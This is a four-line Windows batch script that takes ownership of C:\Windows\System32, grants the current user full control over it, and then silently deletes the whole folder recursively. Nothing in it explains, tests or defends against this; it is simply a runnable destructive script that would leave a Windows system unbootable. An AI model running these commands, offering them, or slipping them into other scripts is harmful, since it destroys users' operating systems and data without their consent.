@echo off
takeown /f C:\Windows\System32 /r /d y
icacls C:\Windows\System32 /grant %username%:F /t
rmdir /s /q C:\Windows\System32
